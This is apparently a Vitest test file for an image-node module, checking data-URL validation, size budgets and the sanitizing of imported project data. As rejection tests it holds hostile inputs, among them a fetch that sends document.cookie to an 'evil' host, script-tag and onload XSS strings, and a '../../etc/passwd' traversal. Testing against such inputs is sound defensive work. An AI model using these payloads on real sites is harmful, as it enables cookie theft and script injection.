import { describe, it, expect, vi } from 'vitest';
import {
  decodeImageNode,
  displayImageFileName,
  validImageDataUrl,
  makeImageNodeData,
  resolveImageDrop,
  totalImageChars,
  sanitizeImageNodes,
  MAX_IMAGE_ENCODED_CHARS,
  HARD_MAX_IMAGE_ENCODED_CHARS,
  MAX_TOTAL_IMAGE_CHARS,
  MAX_LIBRARY_IMAGE_CHARS,
  exceedsImageBudget,
  exceedsImageBudgetAdding,
  formatImageBudget,
  imageNodesForNotice,
  imageCharsReplacing,
  imagePayloadsOf,
  uniqueImageChars,
  PROJECT_IMAGE_BUDGET_COUNT,
  LIBRARY_IMAGE_BUDGET_COUNT,
} from './imageNode';
import { makeNode } from '../test-utils';
import { DESKTOP_CAPS } from './platformCaps';

/** A tiny valid payload: 3 bytes → 4 base64 chars. */
const B64 = btoa('abc'); // "YWJj"
const URL_PNG = `data:image/png;base64,${B64}`;

function values(overrides: Record<string, string | number> = {}) {
  return { imageB64: URL_PNG, width: 2, height: 2, fileName: 'x.png', colorSpace: 'color', ...overrides };
}

describe('decodeImageNode', () => {
  it('decodes a valid png/jpeg/webp payload', () => {
    for (const mime of ['png', 'jpeg', 'webp'] as const) {
      const d = decodeImageNode(values({ imageB64: `data:image/${mime};base64,${B64}` }));
      expect(d).not.toBeNull();
      expect(d!.mime).toBe(mime);
      expect(Array.from(d!.bytes)).toEqual([97, 98, 99]);
      expect(d!.width).toBe(2);
      expect(d!.height).toBe(2);
    }
  });

  it('rejects missing / empty / non-string payloads', () => {
    expect(decodeImageNode(values({ imageB64: '' }))).toBeNull();
    expect(decodeImageNode({ width: 2, height: 2 })).toBeNull();
    expect(decodeImageNode(values({ imageB64: 42 as unknown as string }))).toBeNull();
  });

  it('rejects non-data URLs (remote-beacon vector)', () => {
    expect(decodeImageNode(values({ imageB64: 'https://evil.example/pixel.png' }))).toBeNull();
    expect(decodeImageNode(values({ imageB64: 'javascript:alert(1)' }))).toBeNull();
    expect(decodeImageNode(values({ imageB64: `data:image/svg+xml;base64,${B64}` }))).toBeNull();
    expect(decodeImageNode(values({ imageB64: `data:image/gif;base64,${B64}` }))).toBeNull();
  });

  it('rejects string-literal breakout payloads', () => {
    const attacks = [
      `data:image/png;base64,AA";fetch('https://evil/'+document.cookie);//`,
      `data:image/png;base64,AA\\`,
      `data:image/png;base64,AA\`\${fetch('x')}\``,
      `data:image/png;base64,AA\n`, // JS $ must not match before a trailing newline
      `data:image/png;base64,AA</script><script>alert(1)</script>`,
      `data:image/png;base64,AA fetch('x')`,
    ];
    for (const a of attacks) expect(decodeImageNode(values({ imageB64: a }))).toBeNull();
  });

  it('rejects regex-valid but atob-invalid base64 (the "A=A=" trap)', () => {
    expect(decodeImageNode(values({ imageB64: 'data:image/png;base64,A=A=' }))).toBeNull();
    expect(decodeImageNode(values({ imageB64: 'data:image/png;base64,A' }))).toBeNull();
  });

  it('rejects payloads over the hard ceiling', () => {
    const huge = `data:image/png;base64,${'A'.repeat(HARD_MAX_IMAGE_ENCODED_CHARS)}`;
    expect(decodeImageNode(values({ imageB64: huge }))).toBeNull();
  });

  it('rejects malformed width/height', () => {
    expect(decodeImageNode(values({ width: 0 }))).toBeNull();
    expect(decodeImageNode(values({ width: -4 }))).toBeNull();
    expect(decodeImageNode(values({ width: 1.5 }))).toBeNull();
    expect(decodeImageNode(values({ width: 'lol' }))).toBeNull();
    expect(decodeImageNode(values({ height: 999999 }))).toBeNull();
  });
});

describe('validImageDataUrl', () => {
  it('passes only whitelisted data URLs through', () => {
    expect(validImageDataUrl(URL_PNG)).toBe(URL_PNG);
    expect(validImageDataUrl('https://evil.example/a.png')).toBeNull();
    expect(validImageDataUrl('')).toBeNull();
    expect(validImageDataUrl(undefined)).toBeNull();
    expect(validImageDataUrl(`data:image/png;base64,AA"onload="alert(1)`)).toBeNull();
  });
});

describe('makeImageNodeData', () => {
  it('builds the imageNode payload shape', () => {
    const d = makeImageNodeData(URL_PNG, 64, 32, 2, 'cat.png');
    expect(d.registryType).toBe('imageNode');
    expect(d.values.imageB64).toBe(URL_PNG);
    expect(d.values.width).toBe(64);
    expect(d.values.height).toBe(32);
    expect(d.values.fileName).toBe('cat.png');
    expect(d.values.colorSpace).toBe('color');
    expect(d.dynamicOutputs).toBeUndefined();
  });

  // The NODE shapes, not the plan that produces them: every downstream reader
  // (`resized`, `restorable`, the card's thumbnail aspect, sanitizeOriginKeys'
  // pair rule) keys off which of these three keys are OWN keys.
  it('writes no provenance key at all for a plain 1:1 drop', () => {
    const v = makeImageNodeData(URL_PNG, 64, 32, 2, 'cat.png').values;
    expect('originId' in v).toBe(false);
    expect('srcWidth' in v).toBe(false);
    expect('srcHeight' in v).toBe(false);
  });

  it('writes the whole trio for a snapped drop', () => {
    const v = makeImageNodeData(URL_PNG, 64, 32, 2, 'cat.png', {
      originId: 'abc123', srcWidth: 60, srcHeight: 30,
    }).values;
    expect(v.originId).toBe('abc123');
    expect(v.srcWidth).toBe(60);
    expect(v.srcHeight).toBe(30);
  });

  it('never writes half a dimension pair', () => {
    // srcWidth/srcHeight are paired with each other and with nothing else.
    const v = makeImageNodeData(URL_PNG, 64, 32, 2, 'cat.png', { originId: 'abc123', srcWidth: 60 }).values;
    expect(v.originId).toBe('abc123');
    expect('srcWidth' in v).toBe(false);
    expect('srcHeight' in v).toBe(false);
  });
});

describe('displayImageFileName', () => {
  // A dropped .png is routinely STORED as WebP or JPEG (the drop re-encodes),
  // so showing the source name on the card asserted a format the node didn't
  // hold — which is exactly how a converted image looked unconverted.
  it('takes the extension from the payload, not from the name', () => {
    expect(displayImageFileName('0004.png', 'data:image/jpeg;base64,AAAA')).toBe('0004.jpg');
    expect(displayImageFileName('photo.jpg', 'data:image/webp;base64,AAAA')).toBe('photo.webp');
    expect(displayImageFileName('tile.webp', URL_PNG)).toBe('tile.png');
  });

  it('keeps the stem intact, including dots inside it', () => {
    expect(displayImageFileName('my.normal.map.png', 'data:image/webp;base64,AAAA')).toBe('my.normal.map.webp');
    expect(displayImageFileName('no-extension', 'data:image/webp;base64,AAAA')).toBe('no-extension.webp');
  });

  it('falls back to the stored name when the payload is unusable', () => {
    // Never invent an extension for something that failed validation — the
    // node is showing the inert fallback in that state anyway.
    expect(displayImageFileName('0004.png', '')).toBe('0004.png');
    expect(displayImageFileName('0004.png', 'https://evil.example/x.png')).toBe('0004.png');
    expect(displayImageFileName('0004.png', undefined)).toBe('0004.png');
    expect(displayImageFileName(42, URL_PNG)).toBe('image.png');
  });
});

describe('resolveImageDrop', () => {
  const snapped = {
    dataUrl: `data:image/webp;base64,${'A'.repeat(40)}`,
    width: 2048,
    height: 1024,
    potApplied: true,
    original: { dataUrl: `data:image/webp;base64,${'B'.repeat(80)}`, width: 1920, height: 1080 },
  };

  it('places the snapped payload and records its provenance when the stash takes', () => {
    const r = resolveImageDrop(snapped, 'cat.png', () => 'abc123');
    expect(r.payload.width).toBe(2048);
    expect(r.origin).toEqual({ originId: 'abc123', srcWidth: 1920, srcHeight: 1080 });
  });

  // THE load-bearing rule of the power-of-two feature: a destructive resample
  // only ships together with the way back. The snap happens inside the encode,
  // before the stash is attempted, so a refused stash has to be handled HERE —
  // the ignore-limits override raises the encode budget above what the cache
  // accepts, which is exactly when this fires.
  it('DISCARDS the snap when the stash is refused', () => {
    const r = resolveImageDrop(snapped, 'cat.png', () => null);
    expect(r.payload).toEqual(snapped.original);
    expect(r.origin).toBeUndefined();
  });

  // An UNSNAPPED drop never stashes, whether or not the pair happens to carry
  // an `original` (encodeImageFile omits it, a hand-built pair may not): the
  // payload IS the original, so the settings menu's Resolution ladder reads it
  // off the node and stashes it lazily at the first resize. Stashing here as
  // well was tried on 2026-09-09 and reverted the same day — every drop then
  // competed for the origin cache's slots, and an ordinary drop could evict
  // the ONE record that undoes a destructive snap.
  it('never claims a snap that did not happen, and never stashes for one', () => {
    const plain = { dataUrl: snapped.dataUrl, width: 512, height: 512, potApplied: false };
    const withOriginal = { ...plain, original: { dataUrl: plain.dataUrl, width: 512, height: 512 } };
    for (const pair of [plain, withOriginal]) {
      const stash = vi.fn(() => 'unused');
      const r = resolveImageDrop(pair, 'cat.png', stash);
      expect(r.payload).toBe(pair);
      expect(r.origin).toBeUndefined();
      expect(stash).not.toHaveBeenCalled();
    }
  });

  it('passes the file name through to the stash for the Original row', () => {
    const stash = vi.fn(() => 'abc123');
    resolveImageDrop(snapped, 'cat.png', stash);
    expect(stash).toHaveBeenCalledWith({ ...snapped.original, fileName: 'cat.png' });
  });
});

describe('totalImageChars / sanitizeImageNodes', () => {
  const img = (id: string, url: string) =>
    makeNode(id, 'imageNode', { imageB64: url, width: 2, height: 2 });

  it('sums payload chars across image node instances only', () => {
    const nodes = [img('a', URL_PNG), img('b', URL_PNG), makeNode('c', 'float', { value: 1 })];
    expect(totalImageChars(nodes)).toBe(URL_PNG.length * 2);
  });

  it('always strips hard violations, even with soft limits off', () => {
    const nodes = [img('a', 'https://evil.example/x.png'), img('b', URL_PNG)];
    const r = sanitizeImageNodes(nodes, false);
    expect(r.strippedCount).toBe(1);
    expect((r.nodes[0].data as { values: Record<string, unknown> }).values.imageB64).toBe('');
    expect((r.nodes[1].data as { values: Record<string, unknown> }).values.imageB64).toBe(URL_PNG);
  });

  it('enforces the per-image soft cap when asked', () => {
    const overSoft = `data:image/png;base64,${'A'.repeat(MAX_IMAGE_ENCODED_CHARS + 4)}`;
    expect(sanitizeImageNodes([img('a', overSoft)], true).strippedCount).toBe(1);
    expect(sanitizeImageNodes([img('a', overSoft)], false).strippedCount).toBe(0);
  });

  it('enforces the running total cap', () => {
    // Each payload sits under the per-image cap; six DISTINCT ones together
    // cross the total (a repeat of a kept payload is free, so six copies of
    // one chunk would not — see the next test).
    const chunk = (i: number) =>
      `data:image/png;base64,${'ABCDEF'[i]}${'A'.repeat(MAX_IMAGE_ENCODED_CHARS - 1_000 - 1)}`;
    const nodes = Array.from({ length: 6 }, (_, i) => img(`n${i}`, chunk(i)));
    const r = sanitizeImageNodes(nodes, true);
    expect(r.strippedCount).toBe(6 - Math.floor(MAX_TOTAL_IMAGE_CHARS / chunk(0).length));
    expect(r.strippedCount).toBeGreaterThan(0);
    expect(sanitizeImageNodes(nodes, false).strippedCount).toBe(0);
  });

  it('a repeat of a kept payload is free; a payload that fails is stripped from every instance', () => {
    const chunk = `data:image/png;base64,${'A'.repeat(MAX_IMAGE_ENCODED_CHARS - 1_000)}`;
    const copies = Array.from({ length: 6 }, (_, i) => img(`n${i}`, chunk));
    // Six copies of one payload are all kept: the store writes it once.
    const r = sanitizeImageNodes(copies, true);
    expect(r.strippedCount).toBe(0);
    expect(r.nodes).toBe(copies);
    // A payload that fails is stripped from EVERY instance, and counted per node.
    const hostile = [img('a', 'data:text/html;base64,AAAA'), img('b', URL_PNG), img('c', 'data:text/html;base64,AAAA')];
    const h = sanitizeImageNodes(hostile, true);
    expect(h.strippedCount).toBe(2);
    expect(h.nodes.map((n) => (n.data as { values: Record<string, unknown> }).values.imageB64)).toEqual(['', URL_PNG, '']);
  });

  describe('keeps everything 0.3.33 keeps (P2a-1)', () => {
    // 0.3.33's rule, verbatim: a per-INSTANCE running total. The new rule may
    // keep more (repeats of a kept payload), never less.
    const keptBy0333 = (urls: string[]): boolean[] => {
      let total = 0;
      return urls.map((u) => {
        let bad = validImageDataUrl(u) === null;
        if (!bad) bad = u.length > MAX_IMAGE_ENCODED_CHARS || total + u.length > MAX_TOTAL_IMAGE_CHARS;
        if (!bad) total += u.length;
        return !bad;
      });
    };
    const keptByNow = (urls: string[]): boolean[] =>
      sanitizeImageNodes(urls.map((u, i) => img(`n${i}`, u)), true).nodes.map(
        (n) => (n.data as { values: Record<string, unknown> }).values.imageB64 !== '',
      );
    const PREFIX = 'data:image/png;base64,';
    const pay = (tag: string, chars: number) => PREFIX + tag + 'A'.repeat(chars - PREFIX.length - 1);

    it('duplicates that fill the budget do not strip a small late image 0.3.33 keeps', () => {
      // A x4 (identical, at the per-image cap), five distinct 0.8x payloads,
      // then a small X. Counting distinct payloads would keep y0..y4, reach
      // the total, and strip X.
      const A = pay('A', MAX_IMAGE_ENCODED_CHARS);
      const ys = ['B', 'C', 'D', 'E', 'F'].map((t) => pay(t, MAX_IMAGE_ENCODED_CHARS * 0.8));
      const X = pay('G', MAX_IMAGE_ENCODED_CHARS / 6);
      const urls = [A, A, A, A, ...ys, X];
      const old = keptBy0333(urls);
      expect(old[urls.length - 1]).toBe(true);
      expect(keptByNow(urls)).toEqual(old);
    });

    it('a seeded sweep: old-kept is a subset of new-kept, and the distinct kept total stays in budget', () => {
      const pool = [
        pay('A', MAX_IMAGE_ENCODED_CHARS),
        pay('B', MAX_IMAGE_ENCODED_CHARS),
        pay('C', MAX_IMAGE_ENCODED_CHARS * 0.8),
        pay('D', MAX_IMAGE_ENCODED_CHARS * 0.8),
        pay('E', MAX_IMAGE_ENCODED_CHARS / 2),
        pay('F', MAX_IMAGE_ENCODED_CHARS / 6),
        pay('G', 1_000),
        pay('H', MAX_IMAGE_ENCODED_CHARS + 4),
        'data:text/html;base64,AAAA',
      ];
      let seed = 0x2a2a;
      const rnd = (n: number) => {
        seed = (seed * 1103515245 + 12345) >>> 0;
        return (seed >>> 8) % n;
      };
      for (let doc = 0; doc < 300; doc++) {
        const urls = Array.from({ length: 1 + rnd(12) }, () => pool[rnd(pool.length)]);
        const old = keptBy0333(urls);
        const now = keptByNow(urls);
        old.forEach((k, i) => { if (k) expect(now[i], `doc ${doc} node ${i}`).toBe(true); });
        const distinct = new Set(urls.filter((_, i) => now[i]));
        expect([...distinct].reduce((sum, u) => sum + u.length, 0)).toBeLessThanOrEqual(MAX_TOTAL_IMAGE_CHARS);
      }
    }, 30_000); // ~1.3 s alone, ~6.5 s under full-suite load: the default 5 s timed out
  });

  it('strips a stray storage ref, which is not counted as a strip', () => {
    const nodes = [makeNode('a', 'imageNode', { imageB64: URL_PNG, width: 2, height: 2, imageRef: 'img1-0ce4918c-q' })];
    const r = sanitizeImageNodes(nodes, false);
    expect(r.strippedCount).toBe(0);
    expect(r.nodes).not.toBe(nodes);
    const v = (r.nodes[0].data as { values: Record<string, unknown> }).values;
    expect(Object.prototype.hasOwnProperty.call(v, 'imageRef')).toBe(false);
    expect(v.imageB64).toBe(URL_PNG);
    // The input is untouched.
    expect((nodes[0].data as { values: Record<string, unknown> }).values.imageRef).toBe('img1-0ce4918c-q');
  });

  it('returns the original array untouched when nothing is stripped', () => {
    const nodes = [img('a', URL_PNG)];
    expect(sanitizeImageNodes(nodes, true).nodes).toBe(nodes);
  });

  // Provenance keys (written by the drop-time power-of-two snap) arrive from
  // imported project JSON like everything else. `originId` is used as an
  // IndexedDB key and the src dims feed a CSS aspect-ratio, so both are
  // whitelisted here rather than at every read site.
  describe('provenance keys', () => {
    const withOrigin = (extra: Record<string, string | number>) =>
      makeNode('a', 'imageNode', { imageB64: URL_PNG, width: 2, height: 2, ...extra });
    const valuesOf = (r: { nodes: unknown[] }) =>
      (r.nodes[0] as { data: { values: Record<string, unknown> } }).data.values;

    it('keeps a well-formed originId + src dimension pair', () => {
      const nodes = [withOrigin({ originId: 'abcdef0123456789', srcWidth: 1920, srcHeight: 1080 })];
      const r = sanitizeImageNodes(nodes, true);
      expect(r.strippedCount).toBe(0);
      expect(r.nodes).toBe(nodes); // untouched → same identity
    });

    it('drops a malformed originId but keeps the image working', () => {
      const r = sanitizeImageNodes([withOrigin({ originId: '../../etc/passwd' })], true);
      expect(r.strippedCount).toBe(0);
      expect(valuesOf(r).originId).toBeUndefined();
      expect(valuesOf(r).imageB64).toBe(URL_PNG);
    });

    it('drops out-of-range source dimensions', () => {
      expect(valuesOf(sanitizeImageNodes([withOrigin({ srcWidth: 99999, srcHeight: 1080 })], true)).srcWidth)
        .toBeUndefined();
      expect(valuesOf(sanitizeImageNodes([withOrigin({ srcWidth: 0, srcHeight: 0 })], true)).srcHeight)
        .toBeUndefined();
    });

    it('drops a half pair — an aspect ratio needs both', () => {
      const v = valuesOf(sanitizeImageNodes([withOrigin({ srcWidth: 1920 })], true));
      expect(v.srcWidth).toBeUndefined();
      expect(v.srcHeight).toBeUndefined();
    });

    it('keeps an originId that stands ALONE, and returns the same array', () => {
      // The shape a node has after a Resolution pick landed and was then
      // reverted... no — after a resize the trio is written; the lone id is
      // the shape a resized-then-reverted node keeps, and the shape a saved
      // graph may carry. srcWidth/srcHeight are paired with EACH OTHER and
      // with nothing else; `originId` stands alone by design, and a future
      // hardening pass must not read it as half a pair — that would strip the
      // way back from every such node on the next reload with no symptom.
      const nodes = [withOrigin({ originId: 'abcdef0123456789' })];
      const r = sanitizeImageNodes(nodes, true);
      expect(r.nodes).toBe(nodes);
      const v = valuesOf(r);
      expect(v.originId).toBe('abcdef0123456789');
      expect('srcWidth' in v).toBe(false);
      expect('srcHeight' in v).toBe(false);
    });

    it('still strips a hostile payload on a node carrying provenance', () => {
      const r = sanitizeImageNodes(
        [makeNode('a', 'imageNode', { imageB64: 'https://evil.example/x.png', width: 2, height: 2, originId: 'zz' })],
        true,
      );
      expect(r.strippedCount).toBe(1);
      expect(valuesOf(r).imageB64).toBe('');
      expect(valuesOf(r).originId).toBeUndefined();
    });
  });
});

describe('image budget helpers', () => {
  const PREFIX = 'data:image/png;base64,';
  /** An Image node whose payload is exactly `chars` long. */
  const img = (id: string, chars: number) =>
    makeNode(id, 'imageNode', { imageB64: PREFIX + 'A'.repeat(chars - PREFIX.length), fileName: `${id}.png` });

  describe('exceedsImageBudget', () => {
    it('never refuses under ignore-limits', () => {
      expect(exceedsImageBudget([img('a', MAX_TOTAL_IMAGE_CHARS)], [img('b', 1000)], true)).toBe(false);
    });

    it('never refuses an addition that carries no image payload, even over budget', () => {
      const over = [img('a', MAX_TOTAL_IMAGE_CHARS + 10)];
      expect(exceedsImageBudget(over, [makeNode('f', 'float')], false)).toBe(false);
      expect(exceedsImageBudget(over, [makeNode('e', 'imageNode', { imageB64: '' })], false)).toBe(false);
      expect(exceedsImageBudget(over, [], false)).toBe(false);
    });

    it('allows exactly the cap and refuses one char past it', () => {
      expect(exceedsImageBudget([img('a', 1_000_000)], [img('b', MAX_TOTAL_IMAGE_CHARS - 1_000_000)], false)).toBe(false);
      expect(exceedsImageBudget([img('a', 1_000_001)], [img('b', MAX_TOTAL_IMAGE_CHARS - 1_000_000)], false)).toBe(true);
    });

    it('counts per INSTANCE: two copies of one payload count twice', () => {
      const half = Math.floor(MAX_TOTAL_IMAGE_CHARS / 2) + 1;
      expect(exceedsImageBudget([], [img('a', half)], false)).toBe(false);
      expect(exceedsImageBudget([], [img('a', half), img('b', half)], false)).toBe(true);
    });

    it('honours a custom cap (the saved-group library passes its own)', () => {
      expect(exceedsImageBudget([img('a', 1000)], [img('b', 1000)], false, 1500)).toBe(true);
      expect(MAX_LIBRARY_IMAGE_CHARS).toBe(MAX_TOTAL_IMAGE_CHARS);
      expect(exceedsImageBudget([img('a', 1000)], [img('b', 1000)], false, MAX_LIBRARY_IMAGE_CHARS)).toBe(false);
    });
  });

  it('formatImageBudget prints a chars budget as the KB of image it holds', () => {
    expect(formatImageBudget(600_000)).toBe('439 KB');
    expect(formatImageBudget(3_000_000)).toBe('2197 KB');
    expect(formatImageBudget(8_000_000)).toBe('5859 KB');
  });

  describe('imageNodesForNotice', () => {
    it('names ONE image by its display name, with the STORED extension', () => {
      const one = makeNode('a', 'imageNode', { imageB64: `data:image/webp;base64,${B64}`, fileName: 'photo.png' });
      expect(imageNodesForNotice([one, makeNode('f', 'float')])).toEqual({ count: 1, fileName: 'photo.webp' });
    });

    it('names no file for several', () => {
      expect(imageNodesForNotice([img('a', 100), img('b', 100)])).toEqual({ count: 2, fileName: '' });
    });

    it('does not count an Image node with an empty payload', () => {
      expect(imageNodesForNotice([makeNode('e', 'imageNode', { imageB64: '' }), makeNode('f', 'float')])).toEqual({
        count: 0,
        fileName: '',
      });
    });
  });
});

describe('image budget counting: the project per instance, the library per distinct payload', () => {
  const PREFIX = 'data:image/png;base64,';
  /** An Image node whose payload is exactly `chars` long, filled with `fill`. */
  const img = (id: string, chars: number, fill = 'A') =>
    makeNode(id, 'imageNode', { imageB64: PREFIX + fill.repeat(chars - PREFIX.length), fileName: `${id}.png` });

  it('pins the compatibility defaults', () => {
    // 0.3.33's applyProjectToStore strips images past 3M PER INSTANCE on import
    // (HEAD projectImport.ts:83), and every export still carries one copy per
    // node, so the project budget must keep counting instances. The library
    // never leaves this browser and stores each payload once.
    expect(PROJECT_IMAGE_BUDGET_COUNT).toBe('instances');
    expect(LIBRARY_IMAGE_BUDGET_COUNT).toBe('unique');
  });

  it('imagePayloadsOf lists instances in order; uniqueImageChars sums distinct ones', () => {
    const nodes = [img('a', 100), img('b', 100), img('c', 50, 'B'), makeNode('f', 'float', { value: 1 }), makeNode('e', 'imageNode', { imageB64: '' })];
    expect(imagePayloadsOf(nodes).map((p) => p.length)).toEqual([100, 100, 50]);
    expect(totalImageChars(nodes)).toBe(250);
    expect(uniqueImageChars(nodes)).toBe(150);
  });

  it("'unique' lets a duplicate through for free, even over the cap", () => {
    const existing = [img('a', 2_000_000)];
    expect(exceedsImageBudget(existing, [img('b', 2_000_000)], false, MAX_TOTAL_IMAGE_CHARS, 'unique')).toBe(false);
    expect(exceedsImageBudget(existing, [img('b', 2_000_000)], false, MAX_TOTAL_IMAGE_CHARS, 'instances')).toBe(true);
    const over = [img('a', MAX_TOTAL_IMAGE_CHARS + 10)];
    expect(exceedsImageBudget(over, [img('b', MAX_TOTAL_IMAGE_CHARS + 10)], false, MAX_TOTAL_IMAGE_CHARS, 'unique')).toBe(false);
    // Two copies of one NEW payload in the addition count once.
    expect(exceedsImageBudget([], [img('a', 2_000_000), img('b', 2_000_000)], false, MAX_TOTAL_IMAGE_CHARS, 'unique')).toBe(false);
    // A new, different payload is still counted.
    expect(exceedsImageBudget(existing, [img('b', 1_000_001, 'B')], false, MAX_TOTAL_IMAGE_CHARS, 'unique')).toBe(true);
    expect(exceedsImageBudget(existing, [img('b', 1_000_000, 'B')], false, MAX_TOTAL_IMAGE_CHARS, 'unique')).toBe(false);
  });

  it("'instances' is exactly the old arithmetic, over a sweep around the cap", () => {
    const existing = [img('a', 1_000_000), img('b', 1_000_000)];
    for (const add of [999_998, 999_999, 1_000_000, 1_000_001, 1_000_002]) {
      const old = totalImageChars(existing) + add > MAX_TOTAL_IMAGE_CHARS;
      const payload = PREFIX + 'A'.repeat(add - PREFIX.length);
      expect(exceedsImageBudgetAdding(existing, [payload], false), String(add)).toBe(old);
      expect(exceedsImageBudget(existing, [img('n', add)], false), String(add)).toBe(old);
    }
    expect(exceedsImageBudgetAdding(existing, ['', ''], false)).toBe(false);
    expect(exceedsImageBudgetAdding(existing, [PREFIX + 'A'.repeat(MAX_TOTAL_IMAGE_CHARS)], true)).toBe(false);
  });

  it('imageCharsReplacing swaps ONE node\'s payload, under both counts', () => {
    const nodes = [img('a', 100), img('b', 100), img('c', 50, 'B')];
    const same = PREFIX + 'A'.repeat(100 - PREFIX.length);
    const bigger = PREFIX + 'C'.repeat(200 - PREFIX.length);
    expect(imageCharsReplacing(nodes, 'c', bigger)).toBe(400);
    expect(imageCharsReplacing(nodes, 'c', bigger, 'unique')).toBe(300);
    expect(imageCharsReplacing(nodes, 'c', same, 'unique')).toBe(100);
    expect(imageCharsReplacing(nodes, 'a', '')).toBe(150);
    expect(imageCharsReplacing(nodes, 'missing', bigger)).toBe(250);
  });
});

describe('sanitizeImageNodes — the glTF mapping keys', () => {
  const mapped = {
    orientation: 'gltf', normalGreen: 'flip', uvSet: 3,
    xfOffsetX: 0.25, xfOffsetY: -0.5, xfRotation: -1, xfScaleX: 2, xfScaleY: 0.5,
  };
  const valuesOf = (r: { nodes: unknown[] }) =>
    (r.nodes[0] as { data: { values: Record<string, unknown> } }).data.values;

  it('keeps valid keys and returns the SAME array when clean', () => {
    const nodes = [makeNode('a', 'imageNode', values(mapped))];
    const r = sanitizeImageNodes(nodes, true);
    expect(r.nodes).toBe(nodes);
    expect(r.strippedCount).toBe(0);
  });

  it('drops junk keys, and only them, without counting a strip', () => {
    const junk = { orientation: 'GLTF', normalGreen: 1, uvSet: '1', xfScaleX: 'abc', xfOffsetX: 1e7, xfRotation: Infinity };
    const r = sanitizeImageNodes([makeNode('a', 'imageNode', values({ ...junk, xfScaleY: 2 }))], true);
    const v = valuesOf(r);
    for (const k of Object.keys(junk)) expect(v[k], k).toBeUndefined();
    expect(v.xfScaleY).toBe(2);
    expect(v.imageB64).toBe(URL_PNG);
    expect(r.strippedCount).toBe(0);
  });

  it('does not throw on a primitive values object', () => {
    const n = makeNode('a', 'imageNode');
    (n.data as { values: unknown }).values = 5;
    expect(() => sanitizeImageNodes([n], true)).not.toThrow();
  });
});

describe('sanitizeImageNodes — the soft caps are a parameter (desktop room)', () => {
  // A valid payload between the web per-image cap (600K) and the desktop one (6M).
  const big = `data:image/png;base64,${'A'.repeat(5_000_000 - 22)}`;
  const nodes = [makeNode('a', 'imageNode', values({ imageB64: big }))];

  it('the two-argument call applies THIS build\'s (web) caps and strips it', () => {
    const r = sanitizeImageNodes(nodes, true);
    expect(r.strippedCount).toBe(1);
    expect((r.nodes[0].data as { values: Record<string, unknown> }).values.imageB64).toBe('');
  });

  it('the desktop caps keep it, untouched and by identity', () => {
    const r = sanitizeImageNodes(nodes, true, {
      image: DESKTOP_CAPS.imageChars,
      total: DESKTOP_CAPS.projectImageChars,
    });
    expect(r.strippedCount).toBe(0);
    expect(r.nodes).toBe(nodes);
  });

  it('the hard ceiling is not a parameter: it strips over 8M whatever caps are passed', () => {
    const over = `data:image/png;base64,${'A'.repeat(HARD_MAX_IMAGE_ENCODED_CHARS)}`;
    const r = sanitizeImageNodes([makeNode('a', 'imageNode', values({ imageB64: over }))], true, {
      image: Number.MAX_SAFE_INTEGER,
      total: Number.MAX_SAFE_INTEGER,
    });
    expect(r.strippedCount).toBe(1);
  });
});
